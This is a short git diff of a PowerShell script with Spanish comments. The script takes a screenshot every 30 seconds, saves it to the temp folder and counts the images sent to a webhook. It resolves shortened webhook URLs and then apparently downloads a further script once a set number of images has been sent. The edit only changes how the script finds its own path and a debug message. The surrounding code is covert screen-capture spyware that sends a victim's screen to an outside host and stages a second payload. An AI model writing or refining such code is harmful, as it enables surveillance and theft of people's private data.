@@ -3,11 +3,11 @@ $seconds = 30 # Intervalo entre capturas
 $a = 0 # Contador de imágenes enviadas al webhook
 $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
-# Almacenar la ruta del script principal
-$scriptPath = $MyInvocation.MyCommand.Path
+# Obtener la ruta del script principal
+$scriptPath = $PSScriptRoot
 
 # Detección de URL acortada
-if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected..000." ; $hookurl = (irm $hookurl).url}
+if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected..0." ; $hookurl = (irm $hookurl).url}
 
 do {
     $Filett = "$env:temp\SC.png"
